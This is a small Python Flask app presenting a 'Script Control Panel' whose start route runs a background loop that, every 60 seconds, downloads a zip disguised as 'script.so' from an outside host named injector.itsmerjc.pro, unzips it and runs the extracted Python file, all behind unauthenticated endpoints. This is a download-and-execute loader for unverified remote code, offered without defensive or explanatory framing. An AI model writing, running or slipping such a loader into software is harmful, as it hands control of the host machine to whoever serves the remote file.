from flask import Flask, render_template_string
import subprocess
import threading
import os

app = Flask(__name__)

script_thread = None
thread_lock = threading.Lock()
stop_event = threading.Event()

def download_unzip_and_run_script():
    while not stop_event.is_set():  # Check if stop_event has been triggered
        subprocess.run(['curl', '-O', 'https://injector.itsmerjc.pro/script.so'])
        subprocess.run(['unzip', '-o', 'script.so'])
        subprocess.run(['python', 'itsmerjc.py'])
        os.remove('script.so')
        stop_event.wait(60)  # Wait for 60 seconds or stop event

@app.route('/start')
def start_script():
    global script_thread
    with thread_lock:
        if script_thread is None or not script_thread.is_alive():
            stop_event.clear()  # Reset the stop event
            script_thread = threading.Thread(target=download_unzip_and_run_script, name="ScriptThread")
            script_thread.daemon = True  # Allows thread to exit when the main program exits
            script_thread.start()
            return 'Script started.'
        else:
            return 'Script is already running.'

@app.route('/stop')
def stop_script():
    global script_thread
    with thread_lock:
        if script_thread and script_thread.is_alive():
            stop_event.set()  # Trigger the stop event to end the thread's loop
            script_thread.join()  # Wait for the thread to finish
            return 'Script stopped.'
        else:
            return 'No script is running.'

@app.route('/restart')
def restart_script():
    stop_script()
    return start_script()

@app.route('/')
def home():
    # Render a simple HTML page with Start, Stop, and Restart buttons
    html = '''
    <html>
    <head>
        <title>Script Control Panel</title>
    </head>
    <body>
        <h1>Control the Script</h1>
        <form action="/start" method="get">
            <button type="submit">Start Script</button>
        </form>
        <form action="/stop" method="get">
            <button type="submit">Stop Script</button>
        </form>
        <form action="/restart" method="get">
            <button type="submit">Restart Script</button>
        </form>
    </body>
    </html>
    '''
    return render_template_string(html)

if __name__ == "__main__":
    app.run()
